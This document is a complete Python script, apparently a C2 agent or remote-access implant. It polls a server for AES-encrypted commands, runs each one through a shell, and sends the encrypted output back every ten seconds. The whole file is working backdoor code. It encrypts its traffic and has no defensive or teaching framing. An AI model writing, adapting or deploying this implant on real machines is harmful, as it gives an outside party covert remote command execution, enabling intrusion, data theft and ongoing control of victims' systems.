import sys
import time
import requests
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode, b64decode

# Define your AES key and IV
AES_KEY = b'\x9feB%\xa3:!\xf2,\xe6\xbf\xb1V\xcb\xed\xbe\xa2p\xf1\x07\x89S%\xa7\x9d\xd4\x1fb\xa7\xe2\xacj'  # Replace with a secure key
AES_IV = b'3\xfd\xd4\x96\x9b\xec6\x8f\xc0\xad!\xa3\xc5d\x0bC' # Replace with a secure IV

def encrypt_message(message):
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(AES_IV), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_message = encryptor.update(message.encode()) + encryptor.finalize()
    return b64encode(encrypted_message).decode()

def decrypt_message(encrypted_message):
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(AES_IV), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_message = decryptor.update(b64decode(encrypted_message)) + decryptor.finalize()
    return decrypted_message.decode()

def fetch_command(server_ip, server_port):
    url = f"http://{server_ip}:{server_port}/command"
    try:
        response = requests.get(url)
        response.raise_for_status()
        encrypted_command = response.json().get("command")
        if encrypted_command:
            # Decrypt the command
            command = decrypt_message(encrypted_command)
            return command
        return None
    except requests.RequestException as e:
        print(f"Error fetching command: {e}")
        return None

def report_output(server_ip, server_port, output):
    url = f"http://{server_ip}:{server_port}/report"
    encrypted_output = encrypt_message(output)  # Encrypt output before sending
    try:
        response = requests.post(url, json={"output": encrypted_output})
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error reporting output: {e}")

def main():
    if len(sys.argv) != 3:
        print("Usage: agent.py <SERVER_IP> <SERVER_PORT>")
        sys.exit(1)

    server_ip = sys.argv[1]
    server_port = sys.argv[2]

    while True:
        command = fetch_command(server_ip, server_port)
        if command:
            try:
                result = subprocess.check_output(command, shell=True, text=True)
                report_output(server_ip, server_port, result)
            except subprocess.CalledProcessError as e:
                report_output(server_ip, server_port, f"Error: {e}")
        time.sleep(10)

if __name__ == "__main__":
    main()